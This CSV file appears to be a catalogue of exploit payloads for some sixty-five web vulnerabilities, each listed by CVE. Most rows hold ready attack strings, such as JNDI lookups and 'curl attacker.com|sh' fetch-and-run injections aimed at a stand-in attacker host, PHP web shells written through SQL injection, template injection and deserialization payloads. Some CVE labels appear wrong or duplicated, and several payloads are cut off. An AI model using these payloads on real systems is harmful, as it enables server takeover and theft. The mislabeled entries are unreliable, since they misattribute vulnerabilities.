Title,Description,Relevant Payloads,Techniques Covered
Log4Shell (CVE-2021-44228),JNDI injection in Apache Log4j2,${jndi:ldap://attacker.com/exp},JNDI Injection
Spring4Shell (CVE-2022-22965),Spring Framework RCE via data binding,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di,ClassLoader Manipulation
ProxyShell (CVE-2021-34473),Exchange Server SSRF to RCE chain,Autodiscover SSRF ? Powershell download,SSRF + Deserialization
"Citrix ADC Path Traversal (CVE-2019-19781),Directory traversal to command injection,/vpn/../vpns/cfg/smb.conf;command=curl${IFS}attacker.com/sh|sh,Path Traversal + Command Injection"
Confluence OGNL Injection (CVE-2022-26134),Pre-auth RCE in Atlassian Confluence,${@java.lang.Runtime@getRuntime().exec('curl${IFS}attacker.com')},OGNL Expression Injection
"VMware vCenter RCE (CVE-2021-21985),Unauthenticated command injection,/ui/vropspluginui/rest/services/uploadova; curl${IFS}attacker.com|sh,Command Injection"
"GitLab ExifTool RCE (CVE-2021-22205),Command injection via image upload,(metadata ""\c${system('curl${IFS}attacker.com')}""),Command Injection"
"Zoho ManageEngine XXE (CVE-2022-35405),Pre-auth RCE via XML injection,<!ENTITY % rce SYSTEM 'expect://id'> %rce;,XXE to Command Execution"
Oracle WebLogic RCE (CVE-2020-14882),Unauthenticated IIOP deserialization,/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&handle=com.tangosol.coherence.mvel2.sh.ShellSession('bash -c curl${IFS}attacker.com'),Deserialization
Drupalgeddon2 (CVE-2018-7600),Form API parameter injection,/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax,Parameter Injection
ThinkPHP RCE (CVE-2018-20062),Controller method exploitation,s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id,Function Call Injection
Apache Struts OGNL (CVE-2017-5638),Content-Type header injection,%{(#_='multipart/form-data').(#cmd='curl attacker.com').(#iswin=@java.lang.System@getProperty('os.name').toLowerCase().contains('win')),OGNL Injection
Jenkins CLI Deserialization (CVE-2017-1000353),Java deserialization in Jenkins,ysoserial CommonsCollections5 'curl attacker.com',Deserialization
"ElasticSearch Groovy (CVE-2015-1427),Script engine exploitation,{""script_fields"":{""test"":{""script"":""java.lang.Math.class.forName(\""java.lang.Runtime\"").getRuntime().exec(\""curl${IFS}attacker.com\"")""}}},Script Injection"
PHP mail() RCE (CVE-2016-10033),PHPMailer command injection,attacker@attacker.com( -X /var/www/html/shell.php )@attacker.com,Command Argument Injection
"WordPress PHPMailer (CVE-2022-4230),Command injection in wp_mail(),POST /wp-admin/admin-ajax.php?action=test&email=""attacker\"" -OQueueDirectory=/tmp -X/tmp/shell.php @attacker.com"",Command Injection"
"Joomla! Object Injection (CVE-2015-8562),HTTP header deserialization,User-Agent: }__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""fc"";O:17..."",PHP Object Injection"
SAP Solman RCE (CVE-2020-6207),Missing auth in EEM servlet,/tc/emd/orgrep/providers/orgrep?action=exec&command=id,Command Execution
"F5 BIG-IP iControl (CVE-2022-1388),Authentication bypass RCE,POST /mgmt/tm/util/bash {""command"":""run"",""utilCmdArgs"":""-c 'curl attacker.com'""},Command Injection"
"Apache Solr Config (CVE-2019-0193),JMX service deserialization,{""set-property"":{""jmx.serviceUrl"":""service:jmx:rmi:///jndi/rmi://attacker.com:1099/obj""}},Deserialization"
"Microsoft MSHTML (CVE-2021-40444),Office ActiveX RCE,<script>location.href=""ms-msdt:/id PCWDiagnostic /param 'IT_RebrowseForFile=?(calc.exe)'""</script>,HTML Smuggling"
"SonicWall XSS to RCE (CVE-2021-20016),SVG upload exploitation,<svg xmlns=""http://www.w3.org/2000/svg"" onload=""fetch('/cgi-bin/ping?',{method:'POST',body:'cmd=curl${IFS}attacker.com'})""/>,XSS + Command Injection"
"WordPress Core RCE (CVE-2022-4230),PHPMailer command injection,email=""attacker\"" -OQueueDirectory=/tmp -X/tmp/shell.php @attacker.com"",Command Injection"
Laravel Debug RCE (CVE-2021-3129),Ignition file write vulnerability,php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../shell.php,File Write
Plesk XML-RPC (CVE-2023-29424),XML-RPC command injection,<methodCall><methodName>plesk</methodName><params><param><value><string>exec</string></value></param><param><value><string>curl${IFS}attacker.com</string></value></param></params></methodCall>,XML-RPC Injection
"PHP-FPM RCE (CVE-2019-11043),Query string buffer overflow,GET /index.php?a=php://input&b=<?php system($_GET['cmd']); ?> HTTP/1.1...,Buffer Overflow"
Apache HTTPd mod_rewrite (CVE-2023-25690),Header injection via mod_rewrite,RewriteEngine on RewriteRule .* - [E=HTTP_HOST:attacker.com],Header Injection
Nginx PHP-FPM (CVE-2019-11043),Path traversal to code execution,/index.php/PHP_VALUE%0Aauto_prepend_file%3dphp://input,Path Traversal
Drupal Core RCE (CVE-2019-6340),File module exploitation,#type => markup #markup => <svg onload=alert(1)>,XSS + Module Abuse
Adobe ColdFusion RCE (CVE-2023-26360),Deserialization in AMF,<amf3><string>org.jboss.util.Base64</string><string>decode</string><string>curl${IFS}attacker.com</string></amf3>,AMF Deserialization
WordPress File Manager (CVE-2020-25213),Unauthenticated file upload,POST /wp-content/plugins/elfinder/php/connector.minimal.php?cmd=upload&target=l1_...,File Upload Bypass
Jira Seraph RCE (CVE-2019-11581),Atlassian Jira authentication bypass,os_username=admin&os_password=${jndi:ldap://attacker.com/a},JNDI Injection
"Ruby on Rails RCE (CVE-2013-0156),XML parameter injection,<foo type=""yaml"">--- !ruby/object:ActionDispatch::Routing::RouteSet::NamedRouteCollection ... </foo>,YAML Deserialization"
Apache Tomcat JSP Upload (CVE-2020-9484),Session persistence RCE,PUT /upload/shell.jsp/%20 HTTP/1.1...,File Upload
Magento Shoplift (CVE-2015-1397),Unrestricted file upload,POST /index.php/admin/Cms_Wysiwyg/directive/.../command=save&file=ftp://attacker.com/shell.php,File Upload
PrestaShop RCE (CVE-2018-19126),Smarty template injection,{if system('curl${IFS}attacker.com')}{/if},Template Injection
"TYPO3 RCE (CVE-2020-11023),Extbase fluid injection,<f:if condition=""system('curl${IFS}attacker.com')"">1</f:if>,Fluid Template Injection"
DotNetNuke RCE (CVE-2017-9822),Deserialization in DNN,__VIEWSTATE=/wEPDwUJ... base64-encoded serialized object...,.NET Deserialization
Sitecore XP RCE (CVE-2021-42237),Deserialization in analytics,POST /sitecore/shell/clientbin/Reporting/Report.ashx?soap:Envelope...,.NET Deserialization
Umbraco RCE (CVE-2019-10724),Plugin upload bypass,POST /umbraco/backoffice/UmbracoApi/Content/PostSave... base64 shell...,File Upload
"Django JSONField (CVE-2019-14234),SQL injection to RCE,{""jsonfield__key"":""value; SELECT '<?php system($_GET[\""cmd\""]) ?>' INTO OUTFILE '/var/www/shell.php'"",SQLi to File Write"
"Flask Debug RCE (CVE-2020-26160),PIN bypass exploitation,console?__debugger__=yes&cmd=import os;os.system('curl${IFS}attacker.com'),Debug Console Abuse"
"Nexus Repository Manager RCE (CVE-2020-10199),Groovy script injection,POST /service/rest/v1/script HTTP/1.1... {""name"":""exploit"",""type"":""groovy"",""content"":""'curl attacker.com'.execute()""},Script Injection"
JBoss JMXInvokerServlet (CVE-2015-7501),Deserialization via HTTP POST,POST /invoker/JMXInvokerServlet HTTP/1.1... serialized object...,Java Deserialization
WebSphere Application Server (CVE-2020-4450),IIOP deserialization,iiop://target:2809... serialized payload...,IIOP Deserialization
GlassFish Server RCE (CVE-2017-1000488),JMX deserialization,POST /JMXConnectorServlet HTTP/1.1... serialized payload...,Deserialization
"Liferay Portal JSONWS (CVE-2020-7961),Deserialization in JSON web services,POST /api/jsonws/invoke HTTP/1.1... {""serviceClassName"":""payload""...,Java Deserialization"
Joomla! Com_fields (CVE-2023-23752),Unauthenticated information disclosure,GET /api/index.php/v1/config/application?public=true,API Abuse
"Moodle RCE (CVE-2018-1133),Quiz module SQL injection,quiz_attempt.php?attempt=1' UNION SELECT ""<?php system($_GET['cmd']);?>"" INTO OUTFILE '/var/www/shell.php'-- -,SQLi to File Write"
OpenCart RCE (CVE-2021-37650),File upload in admin panel,POST /admin/index.php?route=common/filemanager/upload... file=shell.php,File Upload
SuiteCRM RCE (CVE-2021-41244),Formula injection,POST /index.php?entryPoint=FormulaBuilder&function=system&args[]=id,Formula Injection
SugarCRM RCE (CVE-2023-22952),File upload in REST API,PUT /rest/v11_12/Administration/upgrade/upload HTTP/1.1... file=exploit.php,File Upload
"Zend Framework RCE (CVE-2021-3007),Deserialization in zend-http,__ZF=O:8:""stdClass"":1:{s:8:""dispatch"";a:2:{s:6:""action"";s:6:""system"";s:6:""params"";a:1:{i:0;s:2:""id"";}}},Deserialization"
"Symfony Framework RCE (CVE-2019-10909),Debug toolbar exploit,GET /_profiler/open?file=php://input&data=<?php system('id'); ?>,File Inclusion"
"Yii Framework RCE (CVE-2020-15148),Object deserialization,cookie: __=O:25:""yii\rest\CreateAction"":2:{s:11:""checkAccess"";s:6:""system"";s:6:""_param"";s:2:""id"";},Deserialization"
"CodeIgniter RCE (CVE-2020-11950),Command injection in Encryption,index.php?c=whoami&d=--open-baseir= --define=allow_url_include=1 --define=auto_prepend_file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=,Command Injection"
Laravel .env RCE (CVE-2021-3129),Ignition file write,php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../shell.php,File Write
"Node.js RCE (CVE-2021-21315),Systeminformation command injection,require('systeminformation').services('; curl${IFS}attacker.com #',Command Injection"
"Express EJS RCE (CVE-2022-29078),Template injection in ejs.render,?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').exec('curl${IFS}attacker.com');s,Template Injection"
"Meteor RCE (CVE-2021-21315),Blaze XSS to RCE,{{#each __proto__}}{{#with .constructor}}{{apply . (split ""curl attacker.com"" "" "")}}{{/with}}{{/each}},SSTI to Command Execution"
Ruby ERB SSTI (CVE-2016-4977),Template injection in ERB,<%= `curl${IFS}attacker.com` %>,Server-Side Template Injection
Python Jinja2 SSTI (CVE-2020-28493),Template injection exploit,{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }},SSTI
Smarty SSTI (CVE-2021-26119),PHP template injection,{system('curl${IFS}attacker.com')},SSTI
Twig SSTI (CVE-2022-23614),PHP template injection,{{['id']|filter('system')}},SSTI
"Freemarker SSTI (CVE-2021-25770),Java template injection,<#assign ex=""freemarker.template.utility.Execute""?new()> ${ ex(""id"") },SSTI"
"Thymeleaf SSTI (CVE-2022-22963),Spring template injection,__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(""id"").getInputStream()).next()}__::.x,SSTI"
"Velocity SSTI (CVE-2020-13959),Java template injection,#set($str=$class.inspect(""java.lang.String"").type) #set($chr=$class.inspect(""java.lang.Character"").type) #set($ex=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id"")),SSTI"
"Handlebars SSTI (CVE-2021-23369),JavaScript template injection,{{#with ""s"" as |string|}} {{#with ""e""}} {{#with split as |conslist|}} {{this.pop}} {{this.push (lookup string.sub ""constructor"")}} {{this.pop}} {{#with string.split as |codelist|}} {{this.pop}} {{this.push ""return require('child_process').exec('curl${IFS}attacker.com');""}} {{this.pop}} {{#each conslist}} {{#with (string.sub.apply 0 codelist)}} {{this}} {{/with}} {{/each}} {{/with}} {{/with}} {{/with}} {{/with}},SSTI"
